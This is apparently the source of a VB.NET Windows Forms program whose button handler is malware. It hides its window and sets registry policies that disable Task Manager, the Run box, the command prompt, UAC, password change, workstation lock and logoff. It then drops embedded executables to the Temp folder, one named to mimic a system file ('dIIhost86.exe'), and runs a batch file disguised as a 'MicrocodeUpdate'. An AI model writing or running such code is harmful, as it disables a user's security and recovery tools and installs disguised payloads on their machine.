Public Class Form1
    Dim RegistryKey As Object

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load

    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        On Error Resume Next
        Me.Visible = False
        RegistryKey = CreateObject("Wscript.shell")
        RegistryKey.regwrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", 1, "REG_DWORD")
        RegistryKey = CreateObject("Wscript.shell")
        RegistryKey.regwrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoRun", 1, "REG_DWORD")
        RegistryKey = CreateObject("Wscript.shell")
        RegistryKey.regwrite("HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System\DisableCMD", 2, "REG_DWORD")
        RegistryKey = CreateObject("Wscript.shell")
        RegistryKey.regwrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools", 0, "REG_DWORD")
        RegistryKey = CreateObject("Wscript.shell")
        RegistryKey.regwrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin", 0, "REG_DWORD")
        RegistryKey = CreateObject("Wscript.shell")
        RegistryKey.regwrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA", 0, "REG_DWORD")
        RegistryKey = CreateObject("Wscript.shell")
        RegistryKey.regwrite("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\HideFastUserSwitching", 1, "REG_DWORD")
        RegistryKey = CreateObject("Wscript.shell")
        RegistryKey.regwrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableChangePassword", 1, "REG_DWORD")
        RegistryKey = CreateObject("Wscript.shell")
        RegistryKey.regwrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableLockWorkstation", 1, "REG_DWORD")
        RegistryKey = CreateObject("Wscript.shell")
        RegistryKey.regwrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoLogoff", 1, "REG_DWORD")
        IO.File.WriteAllBytes(My.Computer.FileSystem.SpecialDirectories.Temp & "\dIIhost86.exe", My.Resources.dIIhost86)
        IO.File.WriteAllBytes(My.Computer.FileSystem.SpecialDirectories.Temp & "\christmas.exe", My.Resources.Christmas)
        IO.File.WriteAllBytes(My.Computer.FileSystem.SpecialDirectories.Temp & "\death.wav", My.Resources.death)
        IO.File.WriteAllBytes(My.Computer.FileSystem.SpecialDirectories.Temp & "\xmas.wav", My.Resources.xmas)
        IO.File.WriteAllBytes(My.Computer.FileSystem.SpecialDirectories.Temp & "\MicrocodeUpdate.bat", My.Resources.setupbat)
        Process.Start(My.Computer.FileSystem.SpecialDirectories.Temp & "\MicrocodeUpdate.bat")
    End Sub
End Class
